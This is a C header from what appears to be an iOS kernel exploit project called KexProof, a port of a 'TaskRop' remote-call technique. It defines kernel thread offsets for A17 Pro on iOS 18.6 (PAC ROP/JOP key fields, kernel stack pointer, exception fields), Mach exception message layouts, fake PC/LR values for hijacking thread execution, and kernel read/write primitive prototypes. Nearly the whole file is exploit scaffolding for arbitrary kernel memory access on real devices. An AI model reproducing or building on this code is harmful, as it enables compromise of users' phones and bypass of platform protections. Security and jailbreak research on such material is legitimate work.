// rc.h — TaskRop port (lara) for KexProof: types, offsets, KRW proxies.
// Offsets are for A17 Pro / iOS 18.6 (from lara offsets.m, isA17Above, 18.6).
#ifndef KP_RC_H
#define KP_RC_H

#import <stdint.h>
#import <stdbool.h>
#import <mach/mach.h>

// thread PAC keys / machine fields (A17 / 18.6)
#define KP_OFF_THREAD_MACHINE_ROP_PID   0x1B0
#define KP_OFF_THREAD_MACHINE_JOP_PID   0x1B8
#define KP_OFF_THREAD_MACHINE_KSTACKPTR 0x140
#define KP_OFF_THREAD_T_TRO             0x3E8
#define KP_OFF_THREAD_AST               0x40C
#define KP_OFF_THREAD_MACH_EXC_CODE     0x398
#define KP_OFF_THREAD_MACH_EXC_REASON   0x390
#define KP_OFF_THREAD_MACH_EXC_TYPE     0x394

// arm thread state (same layout as lara RemoteCall.h)
typedef struct {
    uint64_t __x[29];
    uint64_t __fp;
    uint64_t __lr;
    uint64_t __sp;
    uint64_t __pc;
    uint32_t __cpsr;
    uint32_t __flags;
} kp_arm_thread_state64_internal;

// exception message / reply (same as lara exc.h)
typedef struct {
    mach_msg_header_t       Head;
    uint64_t                NDR;
    uint32_t                exception;
    uint32_t                codeCnt;
    uint64_t                codeFirst;
    uint64_t                codeSecond;
    uint32_t                flavor;
    uint32_t                old_stateCnt;
    kp_arm_thread_state64_internal threadState;
    uint64_t                padding[2];
} kp_excmsg;

typedef struct {
    mach_msg_header_t   Head;
    uint64_t            NDR;
    uint32_t            RetCode;
    uint32_t            flavor;
    uint32_t            new_stateCnt;
    kp_arm_thread_state64_internal threadState;
} __attribute__((packed)) kp_excreply;

#define KP_EXC_MSG_SIZE   0x160
#define KP_EXC_REPLY_SIZE 0x13c

#define KP_FAKE_PC        0x301
#define KP_FAKE_LR        0x401

// KRW proxies over KexProof primitives (kreadbuf/kwritebuf).
void kp_rc_kread(uint64_t addr, void *out, size_t size);
void kp_rc_kwrite(uint64_t addr, const void *in, size_t size);
uint64_t kp_rc_kread64(uint64_t addr);
uint32_t kp_rc_kread32(uint64_t addr);
uint16_t kp_rc_kread16(uint64_t addr);
void kp_rc_kwrite64(uint64_t addr, uint64_t v);
void kp_rc_kwrite32(uint64_t addr, uint32_t v);
void kp_rc_kwrite16(uint64_t addr, uint16_t v);

#endif /* KP_RC_H */
